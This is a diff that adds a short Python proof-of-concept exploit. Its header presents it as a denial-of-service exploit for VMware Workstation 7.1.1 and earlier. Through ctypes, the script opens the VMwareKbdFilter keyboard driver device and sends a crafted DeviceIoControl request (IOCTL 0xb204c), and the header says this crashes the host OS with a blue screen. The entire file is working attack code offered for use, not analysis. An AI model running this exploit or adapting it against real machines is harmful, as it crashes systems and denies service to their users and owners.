@@ -1,0 +1,36 @@
+#!/usr/bin/python
+
+#################################################################
+#
+# Title: VMware Workstation <= 7.1.1 VMkbd.sys Denial of Service Exploit
+# Author: Lufeng Li of Neusoft Corporation
+# Vendor: www.vmware.com
+# Platform: Windows Vista
+# Tested: VMware Workstation v7.1.1 build-282343
+# Vulnerable: VMware Workstation <= 7.1.1 build-282343
+# Vendor: http://www.vmware.com/
+# Test: Run this Script on host OS will make host OS BSoD
+#
+#################################################################
+
+from ctypes import *
+
+kernel32 = windll.kernel32
+Psapi    = windll.Psapi
+
+if __name__ == '__main__':
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    CREATE_ALWAYS = 0x2
+    DEVICE_NAME   = "\\\\.\\VMwareKbdFilter"
+
+    dwReturn      = c_ulong()
+    out_size      = 1024
+    in_size       = 1024
+    in_data       =''
+    out_data      =''
+    driver_handle1 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
+						0, None, CREATE_ALWAYS, 0, None)
+
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle1, 0xb204c, in_data,0, out_data, 0,byref(dwReturn), None)
